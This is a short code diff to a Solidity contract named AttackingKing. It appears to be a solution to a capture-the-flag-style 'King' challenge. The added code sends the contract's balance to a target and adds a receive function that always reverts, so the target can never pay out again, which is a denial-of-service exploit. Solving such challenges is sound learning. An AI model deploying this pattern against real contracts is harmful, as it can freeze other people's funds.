@@ -10,7 +10,12 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+    receive() external payable {
+        revert("hacked!");
+    }
+
     function hackContract() external {
-        // Code me!
+        payable(contractAddress).call{value: address(this).balance}("");
+        console.log("test %s", contractAddress);
     }
 }
